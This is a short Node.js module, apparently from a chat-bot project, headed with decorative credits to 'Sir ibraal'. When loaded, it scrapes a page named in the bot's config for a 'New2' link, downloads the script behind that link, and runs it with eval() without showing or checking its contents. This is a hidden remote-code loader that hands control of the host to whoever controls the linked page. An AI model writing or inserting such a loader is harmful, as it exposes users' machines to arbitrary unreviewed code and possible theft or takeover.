//  [SIR CREINS EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir ibraal                                  
//  >> Version: 8.3.5-sir ibraalBot

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchNew2Url() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("New2")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('New2 not found 😭');
    }

    console.log('New2 loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchNew2Url();
